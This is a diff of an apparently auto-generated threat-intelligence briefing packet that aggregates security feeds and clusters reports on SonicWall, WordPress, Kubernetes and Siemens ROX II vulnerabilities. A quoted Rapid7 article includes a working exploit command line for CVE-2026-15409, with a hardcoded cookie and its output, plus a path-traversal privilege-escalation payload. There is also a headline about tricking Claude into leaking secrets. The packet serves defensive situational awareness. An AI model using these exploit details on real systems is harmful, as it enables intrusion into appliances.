@@ -1,13 +1,13 @@
 # PHANTOMSignal Briefing Packet
 
-- Generated: 2026-07-21T23:59:51.427755+00:00
+- Generated: 2026-07-22T03:21:34.456678+00:00
 - Lookback hours: 168
 - Lookback human: 7 days
 - Total feeds: 80
 - Feeds OK: 77
-- Total items in window: 336
-- Total clusters raw: 148
-- Total clusters in packet: 71
+- Total items in window: 331
+- Total clusters raw: 146
+- Total clusters in packet: 69
 - Dropped low score: 77
 - Dropped overflow: 0
 
@@ -70,26 +70,21 @@
 
 ## Feed status
 
-- **Unit 42** (threat_research_primary)
-  - URL: https://unit42.paloaltonetworks.com/feed/
-  - Status: ok
-  - Item count: 15
-  - In window count: 4
 - **CrowdStrike** (threat_research_primary)
   - URL: https://www.crowdstrike.com/blog/feed/
   - Status: ok
   - Item count: 10
   - In window count: 0
+- **Unit 42** (threat_research_primary)
+  - URL: https://unit42.paloaltonetworks.com/feed/
+  - Status: ok
+  - Item count: 15
+  - In window count: 4
 - **Microsoft Security Blog** (threat_research_primary)
   - URL: https://www.microsoft.com/en-us/security/blog/feed/
   - Status: ok
   - Item count: 10
   - In window count: 5
-- **Trend Micro Research** (threat_research_primary)
-  - URL: https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787
-  - Status: ok
-  - Item count: 25
-  - In window count: 0
 - **SentinelOne Labs** (threat_research_primary)
   - URL: https://www.sentinelone.com/labs/feed/
   - Status: ok
@@ -100,16 +95,21 @@
   - Status: parse_error
   - Item count: 0
   - In window count: 0
-- **Microsoft Threat Intelligence** (threat_research_primary)
-  - URL: https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/
+- **Trend Micro Research** (threat_research_primary)
+  - URL: https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787
   - Status: ok
-  - Item count: 10
-  - In window count: 2
+  - Item count: 25
+  - In window count: 0
 - **Sekoia** (threat_research_primary)
   - URL: https://blog.sekoia.io/feed/
   - Status: parse_error
   - Item count: 0
   - In window count: 0
+- **Microsoft Threat Intelligence** (threat_research_primary)
+  - URL: https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 2
 - **Citizen Lab** (threat_research_primary)
   - URL: https://citizenlab.ca/feed/
   - Status: ok
@@ -120,6 +120,11 @@
   - Status: ok
   - Item count: 10
   - In window count: 5
+- **SANS Internet Storm Center** (government_authoritative)
+  - URL: https://isc.sans.edu/rssfeed_full.xml
+  - Status: ok
+  - Item count: 10
+  - In window count: 8
 - **NCSC UK** (government_authoritative)
   - URL: https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml
   - Status: ok
@@ -135,11 +140,11 @@
   - Status: ok
   - Item count: 15
   - In window count: 3
-- **SANS Internet Storm Center** (government_authoritative)
-  - URL: https://isc.sans.edu/rssfeed_full.xml
+- **Horizon3 Attack Research** (offensive_vulnerability_research)
+  - URL: https://horizon3.ai/feed/
   - Status: ok
   - Item count: 10
-  - In window count: 9
+  - In window count: 7
 - **ESET WeLiveSecurity** (threat_research_primary)
   - URL: https://www.welivesecurity.com/en/rss/feed/
   - Status: ok
@@ -150,13 +155,8 @@
   - Status: ok
   - Item count: 10
   - In window count: 1
-- **Horizon3 Attack Research** (offensive_vulnerability_research)
-  - URL: https://horizon3.ai/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 7
-- **GitHub Security Lab** (offensive_vulnerability_research)
-  - URL: https://github.blog/category/security/feed/
+- **Red Canary** (detection_response_operations)
+  - URL: https://redcanary.com/feed/
   - Status: ok
   - Item count: 10
   - In window count: 0
@@ -165,26 +165,26 @@
   - Status: ok
   - Item count: 40
   - In window count: 0
-- **Red Canary** (detection_response_operations)
-  - URL: https://redcanary.com/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 0
 - **Assetnote** (offensive_vulnerability_research)
   - URL: https://www.assetnote.io/resources/research/rss.xml
   - Status: ok
   - Item count: 78
+  - In window count: 0
+- **Recorded Future** (threat_research_primary)
+  - URL: https://www.recordedfuture.com/feed
+  - Status: ok
+  - Item count: 50
+  - In window count: 3
+- **GitHub Security Lab** (offensive_vulnerability_research)
+  - URL: https://github.blog/category/security/feed/
+  - Status: ok
+  - Item count: 10
   - In window count: 0
 - **Exploit-DB** (offensive_vulnerability_research)
   - URL: https://www.exploit-db.com/rss.xml
   - Status: ok
   - Item count: 50
   - In window count: 0
-- **Recorded Future** (threat_research_primary)
-  - URL: https://www.recordedfuture.com/feed
-  - Status: ok
-  - Item count: 50
-  - In window count: 4
 - **watchTowr Labs** (offensive_vulnerability_research)
   - URL: https://labs.watchtowr.com/rss/
   - Status: ok
@@ -195,16 +195,16 @@
   - Status: ok
   - Item count: 10
   - In window count: 0
-- **Proofpoint Threat Insight** (detection_response_operations)
-  - URL: https://www.proofpoint.com/us/rss.xml
-  - Status: ok
-  - Item count: 10
-  - In window count: 0
 - **TrustedSec** (detection_response_operations)
   - URL: https://www.trustedsec.com/feed/
   - Status: ok
   - Item count: 10
   - In window count: 2
+- **Proofpoint Threat Insight** (detection_response_operations)
+  - URL: https://www.proofpoint.com/us/rss.xml
+  - Status: ok
+  - Item count: 10
+  - In window count: 0
 - **Active Countermeasures** (detection_response_operations)
   - URL: https://www.activecountermeasures.com/feed/
   - Status: ok
@@ -214,7 +214,7 @@
   - URL: https://news.sophos.com/en-us/category/threat-research/feed/
   - Status: ok
   - Item count: 15
-  - In window count: 1
+  - In window count: 0
 - **Elastic Security Labs** (detection_response_operations)
   - URL: https://www.elastic.co/security-labs/rss/feed.xml
   - Status: ok
@@ -230,46 +230,46 @@
   - Status: ok
   - Item count: 10
   - In window count: 10
-- **Datadog Security Labs** (cloud_identity_infrastructure)
-  - URL: https://securitylabs.datadoghq.com/rss/feed.xml
-  - Status: ok
-  - Item count: 30
-  - In window count: 0
 - **Trail of Bits** (offensive_vulnerability_research)
   - URL: https://blog.trailofbits.com/feed/
   - Status: ok
   - Item count: 20
-  - In window count: 0
-- **AWS Security Blog** (cloud_identity_infrastructure)
-  - URL: https://aws.amazon.com/blogs/security/feed/
-  - Status: ok
-  - Item count: 20
-  - In window count: 4
-- **Permiso Security** (cloud_identity_infrastructure)
-  - URL: https://permiso.io/blog/rss.xml
-  - Status: ok
-  - Item count: 10
   - In window count: 0
 - **Huntress** (detection_response_operations)
   - URL: https://www.huntress.com/blog/rss.xml
   - Status: ok
   - Item count: 100
   - In window count: 0
+- **Datadog Security Labs** (cloud_identity_infrastructure)
+  - URL: https://securitylabs.datadoghq.com/rss/feed.xml
+  - Status: ok
+  - Item count: 30
+  - In window count: 0
 - **Rapid7** (offensive_vulnerability_research)
   - URL: https://www.rapid7.com/blog/rss/
   - Status: ok
   - Item count: 20
   - In window count: 7
-- **Google Cloud Threat Intelligence** (threat_research_primary)
-  - URL: https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v
+- **AWS Security Blog** (cloud_identity_infrastructure)
+  - URL: https://aws.amazon.com/blogs/security/feed/
   - Status: ok
   - Item count: 20
-  - In window count: 2
+  - In window count: 3
+- **Permiso Security** (cloud_identity_infrastructure)
+  - URL: https://permiso.io/blog/rss.xml
+  - Status: ok
+  - Item count: 10
+  - In window count: 0
 - **Protect AI** (ai_security_agentic_risk)
   - URL: https://protectai.com/blog/rss.xml
   - Status: ok
   - Item count: 10
   - In window count: 0
+- **Google Cloud Threat Intelligence** (threat_research_primary)
+  - URL: https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v
+  - Status: ok
+  - Item count: 20
+  - In window count: 2
 - **Sysdig** (detection_response_operations)
   - URL: https://sysdig.com/feed/
   - Status: ok
@@ -285,31 +285,26 @@
   - Status: ok
   - Item count: 100
   - In window count: 4
-- **Coveware** (ransomware_ecrime_financial_crime)
-  - URL: https://www.coveware.com/blog?format=rss
-  - Status: parse_error
-  - Item count: 0
-  - In window count: 0
 - **Cloudflare Radar** (cloud_identity_infrastructure)
   - URL: https://blog.cloudflare.com/tag/cloudflare-radar/rss/
   - Status: ok
   - Item count: 20
   - In window count: 1
-- **OpenSSF Blog** (ai_security_agentic_risk)
-  - URL: https://openssf.org/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 2
 - **Google DeepMind Blog** (ai_security_agentic_risk)
   - URL: https://deepmind.google/blog/rss.xml
   - Status: ok
   - Item count: 100
   - In window count: 3
-- **Google Cloud Security** (cloud_identity_infrastructure)
-  - URL: https://cloudblog.withgoogle.com/rss/
+- **Coveware** (ransomware_ecrime_financial_crime)
+  - URL: https://www.coveware.com/blog?format=rss
+  - Status: parse_error
+  - Item count: 0
+  - In window count: 0
+- **OpenSSF Blog** (ai_security_agentic_risk)
+  - URL: https://openssf.org/feed/
   - Status: ok
-  - Item count: 20
-  - In window count: 20
+  - Item count: 10
+  - In window count: 2
 - **Interconnects** (ai_security_agentic_risk)
   - URL: https://www.interconnects.ai/feed
   - Status: ok
@@ -320,6 +315,11 @@
   - Status: ok
   - Item count: 10
   - In window count: 1
+- **Google Cloud Security** (cloud_identity_infrastructure)
+  - URL: https://cloudblog.withgoogle.com/rss/
+  - Status: ok
+  - Item count: 20
+  - In window count: 20
 - **The Record** (cyber_news_breach_reporting)
   - URL: https://therecord.media/feed
   - Status: ok
@@ -330,8 +330,23 @@
   - Status: ok
   - Item count: 15
   - In window count: 15
+- **AI Snake Oil** (ai_security_agentic_risk)
+  - URL: https://www.aisnakeoil.com/feed
+  - Status: ok
+  - Item count: 20
+  - In window count: 0
 - **SecurityWeek** (cyber_news_breach_reporting)
   - URL: https://www.securityweek.com/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 10
+- **Simon Willison** (ai_security_agentic_risk)
+  - URL: https://simonwillison.net/atom/everything/
+  - Status: ok
+  - Item count: 30
+  - In window count: 22
+- **CyberScoop** (cyber_news_breach_reporting)
+  - URL: https://cyberscoop.com/feed/
   - Status: ok
   - Item count: 10
   - In window count: 10
@@ -340,33 +355,18 @@
   - Status: ok
   - Item count: 100
   - In window count: 1
-- **CyberScoop** (cyber_news_breach_reporting)
-  - URL: https://cyberscoop.com/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 10
 - **Dark Reading** (cyber_news_breach_reporting)
   - URL: https://www.darkreading.com/rss.xml
   - Status: ok
   - Item count: 50
-  - In window count: 25
-- **Simon Willison** (ai_security_agentic_risk)
-  - URL: https://simonwillison.net/atom/everything/
-  - Status: ok
-  - Item count: 30
-  - In window count: 22
+  - In window count: 24
 - **Help Net Security** (cyber_news_breach_reporting)
   - URL: https://www.helpnetsecurity.com/feed/
   - Status: ok
   - Item count: 10
   - In window count: 10
-- **AI Snake Oil** (ai_security_agentic_risk)
-  - URL: https://www.aisnakeoil.com/feed
-  - Status: ok
-  - Item count: 20
-  - In window count: 0
-- **Team Cymru** (ransomware_ecrime_financial_crime)
-  - URL: https://www.team-cymru.com/post/rss.xml
+- **Black Hills Information Security** (detection_response_operations)
+  - URL: https://www.blackhillsinfosec.com/feed/
   - Status: ok
   - Item count: 100
   - In window count: 1
@@ -375,20 +375,20 @@
   - Status: ok
   - Item count: 10
   - In window count: 6
+- **Team Cymru** (ransomware_ecrime_financial_crime)
+  - URL: https://www.team-cymru.com/post/rss.xml
+  - Status: ok
+  - Item count: 100
+  - In window count: 1
 - **Troy Hunt** (practitioner_analysis)
   - URL: https://www.troyhunt.com/rss/
   - Status: ok
   - Item count: 15
-  - In window count: 2
-- **The Hacker News** (cyber_news_breach_reporting)
-  - URL: https://feeds.feedburner.com/TheHackersNews
+  - In window count: 1
+- **Krebs on Security** (practitioner_analysis)
+  - URL: https://krebsonsecurity.com/feed/
   - Status: ok
-  - Item count: 50
-  - In window count: 50
-- **Black Hills Information Security** (detection_response_operations)
-  - URL: https://www.blackhillsinfosec.com/feed/
-  - Status: ok
-  - Item count: 100
+  - Item count: 10
   - In window count: 1
 - **Reddit r/cybersecurity** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/cybersecurity/.rss
@@ -400,13 +400,18 @@
   - Status: ok
   - Item count: 20
   - In window count: 4
-- **Reddit r/sysadmin** (reddit_practitioner_osint)
-  - URL: https://www.reddit.com/r/sysadmin/.rss
+- **The Hacker News** (cyber_news_breach_reporting)
+  - URL: https://feeds.feedburner.com/TheHackersNews
+  - Status: ok
+  - Item count: 50
+  - In window count: 50
+- **Reddit r/blueteamsec** (reddit_practitioner_osint)
+  - URL: https://www.reddit.com/r/blueteamsec/.rss
   - Status: ok
   - Item count: 0
   - In window count: 0
-- **Reddit r/blueteamsec** (reddit_practitioner_osint)
-  - URL: https://www.reddit.com/r/blueteamsec/.rss
+- **Reddit r/sysadmin** (reddit_practitioner_osint)
+  - URL: https://www.reddit.com/r/sysadmin/.rss
   - Status: ok
   - Item count: 0
   - In window count: 0
@@ -415,11 +420,6 @@
   - Status: ok
   - Item count: 0
   - In window count: 0
-- **Intel 471** (ransomware_ecrime_financial_crime)
-  - URL: https://intel471.com/blog/feed
-  - Status: ok
-  - Item count: 100
-  - In window count: 3
 - **Reddit r/netsecstudents** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/netsecstudents/.rss
   - Status: ok
@@ -430,16 +430,16 @@
   - Status: ok
   - Item count: 0
   - In window count: 0
-- **Krebs on Security** (practitioner_analysis)
-  - URL: https://krebsonsecurity.com/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 0
 - **Infosecurity Magazine** (cyber_news_breach_reporting)
   - URL: https://www.infosecurity-magazine.com/rss/news/
   - Status: ok
   - Item count: 100
   - In window count: 26
+- **Intel 471** (ransomware_ecrime_financial_crime)
+  - URL: https://intel471.com/blog/feed
+  - Status: ok
+  - Item count: 100
+  - In window count: 3
 - **Reddit r/netsec** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/netsec/.rss
   - Status: ok
@@ -477,7 +477,7 @@
 - Anchor signal: WordPress
 - Theme key: wordpress
 - Cluster count: 6
-- Article count: 26
+- Article count: 25
 - Cohesion: 0.222
 - Shared strong signals: WordPress
 - Member CVEs: (none)
@@ -493,7 +493,6 @@
   - https://horizon3.ai/attack-research/vulnerabilities/cve-2026-15409-cve-2026-15410/
   - https://www.helpnetsecurity.com/2026/07/21/sonicwall-sma-zero-days-exploited-cve-2026-15409-cve-2026-15410/
   - https://www.volexity.com/blog/2026/07/17/proxying-to-compromise-sonicwall-secure-mobile-access-0-day-exploitation/
-  - https://www.sophos.com/en-us/blog/sonicwall-sma1000-vulnerabilities-in-active-exploitation
   - https://www.bleepingcomputer.com/news/security/sonicwall-sma1000-flaws-exploited-as-zero-days-to-push-custom-malware/
   - https://thehackernews.com/2026/07/weekly-recap-wordpress-rce-sonicwall-0.html
   - https://www.darkreading.com/vulnerabilities-threats/inc-ransomware-exploits-sonicwall-sma-zero-days
@@ -516,7 +515,7 @@
 - Anchor signal: Microsoft SharePoint
 - Theme key: microsoft-sharepoint
 - Cluster count: 4
-- Article count: 18
+- Article count: 17
 - Cohesion: 0.21
 - Shared strong signals: Microsoft SharePoint
 - Member CVEs: (none)
@@ -533,7 +532,6 @@
   - https://horizon3.ai/attack-research/vulnerabilities/cve-2026-15409-cve-2026-15410/
   - https://www.helpnetsecurity.com/2026/07/21/sonicwall-sma-zero-days-exploited-cve-2026-15409-cve-2026-15410/
   - https://www.volexity.com/blog/2026/07/17/proxying-to-compromise-sonicwall-secure-mobile-access-0-day-exploitation/
-  - https://www.sophos.com/en-us/blog/sonicwall-sma1000-vulnerabilities-in-active-exploitation
   - https://www.bleepingcomputer.com/news/security/sonicwall-sma1000-flaws-exploited-as-zero-days-to-push-custom-malware/
   - https://thehackernews.com/2026/07/weekly-recap-wordpress-rce-sonicwall-0.html
   - https://www.darkreading.com/vulnerabilities-threats/inc-ransomware-exploits-sonicwall-sma-zero-days
@@ -677,11 +675,31 @@
   - https://thehackernews.com/2026/07/new-7-zip-vulnerability-could-let.html
   - https://trustedsec.com/blog/the-new-hotness-in-phishing-device-code-attacks-in-m365
 
+### Kubernetes active exploitation
+- Anchor signal: Kubernetes
+- Theme key: kubernetes
+- Cluster count: 3
+- Article count: 4
+- Cohesion: 0.257
+- Shared strong signals: Kubernetes
+- Member CVEs: (none)
+- Also targets: (none)
+- Dominant features:
+  - threat_categories: active_exploitation, ransomware_extortion
+  - affected_products: Kubernetes
+  - urgency_signals: actively_exploited
+- Cluster IDs: 9e0819b3d1, 9454090822, 36d4f9221e
+- Links:
+  - https://orca.security/resources/blog/cve-2026-42533-nginx-heap-buffer-overflow/
+  - https://thehackernews.com/2026/07/critical-nginx-vulnerability-can-crash.html
+  - https://webflow.sysdig.com/blog/four-ways-ai-has-fundamentally-changed-the-threat-landscape-in-2026
+  - https://webflow.sysdig.com/blog/the-cisos-guide-to-headless-cloud-security
+
 ### AWS vulnerability activity
 - Anchor signal: AWS
 - Theme key: aws
 - Cluster count: 2
-- Article count: 7
+- Article count: 6
 - Cohesion: 0.857
 - Shared strong signals: AWS
 - Member CVEs: (none)
@@ -713,25 +731,6 @@
   - https://www.microsoft.com/en-us/security/blog/2026/07/15/unpacking-asyncapi-npm-supply-chain-compromise-import-time-payload-delivery/
   - https://thehackernews.com/2026/07/seven-malicious-vite-npm-packages-use.html
   - https://www.microsoft.com/en-us/security/blog/2026/07/17/microsoft-at-black-hat-usa-2026-defending-trust-in-the-age-of-ai-and-supply-chain-attacks/
-
-### Kubernetes active exploitation
-- Anchor signal: Kubernetes
-- Theme key: kubernetes
-- Cluster count: 2
-- Article count: 3
-- Cohesion: 0.322
-- Shared strong signals: Kubernetes
-- Member CVEs: (none)
-- Also targets: (none)
-- Dominant features:
-  - threat_categories: active_exploitation
-  - affected_products: Kubernetes
-  - urgency_signals: actively_exploited
-- Cluster IDs: 9e0819b3d1, 9454090822
-- Links:
-  - https://orca.security/resources/blog/cve-2026-42533-nginx-heap-buffer-overflow/
-  - https://thehackernews.com/2026/07/critical-nginx-vulnerability-can-crash.html
-  - https://webflow.sysdig.com/blog/four-ways-ai-has-fundamentally-changed-the-threat-landscape-in-2026
 
 ### Cisco vulnerability activity
 - Anchor signal: Cisco
@@ -767,7 +766,7 @@
   - Cluster: c951fa224e
   - Sources in window: 3
   - Window hours: 2.2
-  - Cohort count: 4
+  - Cohort count: 3
 - **How I tricked Claude into leaking your deepest, darkest secrets**
   - Cluster: 1a4ef6c9e4
   - Sources in window: 3
@@ -815,13 +814,14 @@
   - Prior top industries: financial_services, government, healthcare
   - Prior top products: GitHub, Microsoft 365, SolarWinds
 
-### Persistence (8)
+### Persistence (9)
 - actor_attribution: ShinyHunters (weeks observed: 8, cluster 17b63d385b)
 - actor_attribution: TeamPCP (weeks observed: 6, cluster e3bb17ebc2)
 - actor_attribution: Scattered Spider (weeks observed: 6, cluster 23d8608b27)
 - cve_ids: CVE-2026-0257 (weeks observed: 4, cluster 17b63d385b)
 - cve_ids: CVE-2026-25089 (weeks observed: 4, cluster 3d70163861)
 - actor_attribution: Cl0p (weeks observed: 4, cluster 46fba7fb46)
+- cve_ids: CVE-2025-3248 (weeks observed: 4, cluster 916dc6a487)
 - cve_ids: CVE-2026-39808 (weeks observed: 3, cluster 3d70163861)
 - cve_ids: CVE-2026-39987 (weeks observed: 3, cluster 9454090822)
 
@@ -840,8 +840,8 @@
 - Published: 2026-07-15T16:19:26+00:00
 - Link: https://www.rapid7.com/blog/post/etr-rapid7-mdr-team-discovers-new-sonicwall-sma1000-zero-days-being-actively-exploited-cve-2026-15409-cve-2026-15410
 - Fetch status: ok
-- Member count: 9
-- Corroborating source count: 8
+- Member count: 8
+- Corroborating source count: 7
 - Strong signals: CVE-2026-15409, CVE-2026-15410, SonicWall
 
 #### Cluster taxonomy (union across members)
@@ -850,7 +850,7 @@
 - cve_ids: CVE-2026-15409, CVE-2026-15410
 - urgency_signals: actively_exploited, critical_cvss, preauth_unauth, zero_day
 - content_type: intel_roundup, news_report, vulnerability_disclosure
-- confidence_tier: tier_1_offensive_research, tier_1_primary_research, tier_2_operator, tier_4_news
+- confidence_tier: tier_1_offensive_research, tier_1_primary_research, tier_4_news
 
 #### Primary article taxonomy
 - threat_categories: zero_day, vulnerability_disclosure, active_exploitation
@@ -872,7 +872,7 @@ Overview On July 14, 2026, SonicWall published a security advisory addressing tw
 Back to Blog Vulnerabilities and Exploits Rapid7 MDR Team Discovers New SonicWall SMA1000 Zero Days being Actively Exploited (CVE-2026-15409, CVE-2026-15410) Rapid7 Jul 15, 2026 | Last updated on Jul 16, 2026 | 8 min read Overview On July 14, 2026, SonicWall published a security advisory addressing two vulnerabilities affecting SMA1000 Series remote access appliances, including the critical server-side request forgery (SSRF) vulnerability CVE-2026-15409 (CVSS 10.0) and the high-severity code injection vulnerability CVE-2026-15410 . The advisory urges customers to immediately apply the latest platform hotfix releases. Successful exploitation of CVE-2026-15409 permits an unauthenticated attacker to open a websocket-based tunnel to arbitrary localhost-only services, while CVE-2026-15410 is a local privilege escalation that permits an attacker with access to an internal service listening on port 8188 on localhost to execute arbitrary operating system commands as root via a malicious path traversal-based remove_hotfix workflow. Both vulnerabilities are being actively exploited in the wild. Prior to SonicWall’s official vulnerability disclosure, Rapid7’s Managed Detection and Response team observed active, targeted zero-day exploitation of internet-facing SMA 1000-series appliances. In the SonicWall advisory, exploitation in the wild was noted , and both CVE-2026-15409 and CVE-2026-15410 have been added to CISA's Known Exploited Vulnerabilities ( KEV ) catalog. Given the confirmed exploitation activity and the critical unauthenticated impact of the vulnerabilities, organizations should prioritize remediation of SMA1000 appliances on an emergency basis. Affected products include SonicWall SMA1000 Series models 6210, 7210, and 8200v running: 12.4.3-03245 12.4.3-03387 12.4.3-03434 (platform-hotfix) 12.5.0-02283 12.5.0-02624 12.5.0-02800 (platform-hotfix) These vulnerabilities do not affect SSL VPN functionality on SonicWall firewalls or the SMA 100 Series product line. Technical overview The primary vulnerability is in a websocket proxy feature, accessed via the path /wsproxy on the affected “SonicWall WorkPlace” application (served on port 443 by default). This feature permits a netcat-like TCP tunnel to arbitrary hosts and ports, which are provided by the user in URL parameters. By provided host values that point to localhost, the attacker can access local SonicWall appliance system services behind the firewall to send and receive arbitrary TCP traffic to and from them. This is the first-stage vulnerability, CVE-2026-15409, that Rapid7 MDR analysts are seeing attackers exploit in the wild. With this capability, an attacker can reach and exploit less-hardened services running on the appliance, such as the Erlang application on localhost:1050 or the ctrl-service application on localhost:8188. We developed an exploit targeting the Erlang process listening on localhost:1050 for remote code execution. Note that the provided cookie value is hardcoded for the Erlang process, based on our testing, so authentication is not required to establish code execution. # python3 cve-2026-15409.py --ws-url 'wss://192.168.1.46/wsproxy?bmID=-3389c1b25ccd&serviceType=SSH&host=0.0.0.0&port=1050' --ws-user-agent 'SMA Connect Agent' --ws-insecure-tls --cookie 10ecad5b446e86864832904cd439b6b70262 --exec 'whoami && id && pwd && hostname' Authenticated to [email protected] Peer flags: 0xd07df7fbd Peer creation: 1784069352 RPC os:cmd/1 => couchdb uid=1010(couchdb) gid=1(daemon) groups=1(daemon) /opt/couchdb SMAAppliance.sma With code execution established, the attacker can escalate to root on the appliance by exploiting CVE-2026-15410, which is a path traversal in the remove_hotfix workflow of ctrl-service. This can be performed via the web console or by hitting port 8188 on the device. The attacker provides a hotfix value containing a path traversal sequence to a malicious script, such as ../../../../var/tmp/privesc . The system executes the script as root and
 ```
 
-#### Corroborating sources (8)
+#### Corroborating sources (7)
 
 - **Rapid7** (offensive_vulnerability_research)
   - Title: Rapid7 MDR Team Discovers New SonicWall SMA1000 Zero Days being Actively Exploited (CVE-2026-15409, CVE-2026-15410)
@@ -894,11 +894,6 @@ Back to Blog Vulnerabilities and Exploits Rapid7 MDR Team Discovers New SonicWal
   - Published: 2026-07-17T22:10:37+00:00
   - Link: https://www.volexity.com/blog/2026/07/17/proxying-to-compromise-sonicwall-secure-mobile-access-0-day-exploitation/
   - Summary: In early July 2026, Volexity was engaged to perform an incident response investigation where it discovered a threat actor had successfully compromised SonicWall Secure Mobile Access (SMA) VPN appliances through […] The post Proxying to Compromise: SonicWall Secure Mobile Access 0-day Exploitation appeared first on Volexity .
-- **Sophos X-Ops** (detection_response_operations)
-  - Title: SonicWall SMA1000 vulnerabilities in active exploitation
-  - Published: 2026-07-15T00:00:00+00:00
-  - Link: https://www.sophos.com/en-us/blog/sonicwall-sma1000-vulnerabilities-in-active-exploitation
-  - Summary: Categories: Threat Research Tags: advisory, Vulnerabilities, SonicWall
 - **BleepingComputer** (cyber_news_breach_reporting)
   - Title: SonicWall SMA1000 flaws exploited as zero-days to push custom malware
   - Published: 2026-07-20T22:23:23+00:00
@@ -1231,7 +1226,56 @@ Table of contents About CVE-2026-11386 Affected Systems Risk Impact How Orca Can
   - Link: https://orca.security/resources/blog/ubuntu-pro-client-vulnerability-cve-2026-11386/
   - Summary: A critical vulnerability (CVE-2026-11386, CVSS 9.0) was disclosed affecting Canonical’s Ubuntu Pro Client (ubuntu-advantage-tools), allowing attackers to execute arbitrary code with root privileges via a spoofed or tampered contract server response. Due to the potential for full system compromise across cloud environments, immediate patching is required. About CVE-2026-11386 The issue originates from the Ubuntu Pro […]
 
-### Cluster 14625d1950 — score 19
+### Cluster d9c1f05e41 — score 18
+
+- Title: Three Steps to the Terminal: A Siemens ROX II Zero-Day Trilogy
+- Source: Unit 42 (threat_research_primary)
+- Published: 2026-07-17T10:00:24+00:00
+- Link: https://unit42.paloaltonetworks.com/siemens-rox-ii-zero-day-vulnerabilities/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: zero_day
+- affected_industries: critical_infrastructure, manufacturing_industrial
+- affected_products: Palo Alto Networks
+- cve_ids: CVE-2025-40947, CVE-2025-40948, CVE-2025-40949
+- urgency_signals: zero_day
+- content_type: news_report
+- confidence_tier: tier_1_primary_research
+
+#### Primary article taxonomy
+- threat_categories: zero_day
+- affected_industries: critical_infrastructure, manufacturing_industrial
+- affected_products: Palo Alto Networks
+- cve_ids: CVE-2025-40947, CVE-2025-40948, CVE-2025-40949
+- urgency_signals: zero_day
+- content_type: news_report
+- confidence_tier: tier_1_primary_research
+
+#### Summary
+
+```
+A technical analysis of three chained zero-day vulnerabilities in Siemens ROX II OT switches that allow privilege escalation and persistent root access. The post Three Steps to the Terminal: A Siemens ROX II Zero-Day Trilogy appeared first on Unit 42 .
+```
+
+#### Full body
+
+```
+Threat Research Center Threat Research Vulnerabilities Vulnerabilities Three Steps to the Terminal: A Siemens ROX II Zero-Day Trilogy 9 min read Related Products Advanced Threat Prevention Cloud-Delivered Security Services Industrial and Operational Technology IoT Security Next-Generation Firewall By: Emmanuel Zhou Adam Robbie Rick Wyble Miguel Pereira Published: July 17, 2026 Categories: Threat Research Vulnerabilities Tags: Command injection CVE-2025-40947 CVE-2025-40948 CVE-2025-40949 Exploit Chain Privilege escalation Rox II OT switches Share Executive Summary We conducted this research in close partnership with Siemens, reflecting our shared commitment to advancing the security and resilience of critical infrastructure. This report details a critical, chained exploit comprising three zero-day vulnerabilities (CVE-2025-40948, CVE-2025-40947, and CVE-2025-40949) discovered in Siemens ROX II operational technology (OT) switches. Successful exploitation of this chain would allow an attacker to achieve full privilege escalation and persistent root-level access on these devices, which are critical components of industrial control networks. The vulnerabilities range from Medium to Critical severity, with CVSS 3.1 scores of 6.8 (CVE-2025-40948), 7.5 (CVE-2025-40947), and 9.1 (CVE-2025-40949). The attack vector proceeds in three stages, escalating from reconnaissance to complete system compromise: Arbitrary file disclosure ( CVE-2025-40948 ): An attacker leverages an insecure configuration of the xz utility, which executes with root privileges, to read any file on the switch’s file system. This vulnerability enables initial reconnaissance that could reveal critical information such as sensitive configuration files, password hashes and private cryptographic keys. Privilege escalation via command injection ( CVE-2025-40947 ): This critical flaw resides in the feature key validation function. The function fails to sanitize an attacker-controlled payload before inserting it directly into a command executed with root privileges. Exploiting this allows for direct command injection and full root access. Persistent root code execution ( CVE-2025-40949 ): Following privilege escalation, the final vulnerability is exploited in the switch’s web management task scheduler. Improper input sanitization allows an authenticated attacker to inject malicious commands into the system’s root cron table. This establishes persistent code execution, surviving system reboots and maintaining full control. These vulnerabilities could collectively transform a vital network security device into a platform for malicious activity, severely threatening the integrity and availability of the industrial network. Siemens has released security advisories SSA-973901 , SSA-078743 and SSA-081142 to address these issues, which recommend that customers update their affected ROX II devices to firmware version V2.17.1. Palo Alto Networks customers are better protected against these threats through the following products and services: Virtual patching detection signatures available via the Next-Generation Firewall with Advanced Threat Prevention OT Device Security If you think you might have been compromised or have an urgent matter, contact the Unit 42 Incident Response team . Related Unit 42 Topics Vulnerabilities , Zero-day , Exploits Partnership Overview The Palo Alto Networks OT Threat Research Lab and Siemens partnered to advance the security and resilience of critical infrastructure through collaborative vulnerability research on the Ruggedcom ROX II platform. We combined the OT Threat Research Lab’s expertise in industrial cybersecurity research with Siemens’ deep product knowledge and the coordination capabilities of Siemens ProductCERT. These teams worked together to identify, validate, remediate and responsibly disclose security vulnerabilities. This collaboration reflects the growing importance of industry partnerships in securing OT environments. As critical inf
+```
+
+#### Corroborating sources (1)
+
+- **Unit 42** (threat_research_primary)
+  - Title: Three Steps to the Terminal: A Siemens ROX II Zero-Day Trilogy
+  - Published: 2026-07-17T10:00:24+00:00
+  - Link: https://unit42.paloaltonetworks.com/siemens-rox-ii-zero-day-vulnerabilities/
+  - Summary: A technical analysis of three chained zero-day vulnerabilities in Siemens ROX II OT switches that allow privilege escalation and persistent root access. The post Three Steps to the Terminal: A Siemens ROX II Zero-Day Trilogy appeared first on Unit 42 .
+
+### Cluster 14625d1950 — score 18
 
 - Title: Now in preview: Find and fix software vulnerabilities with CodeMender
 - Source: Google Cloud Security (cloud_identity_infrastructure)
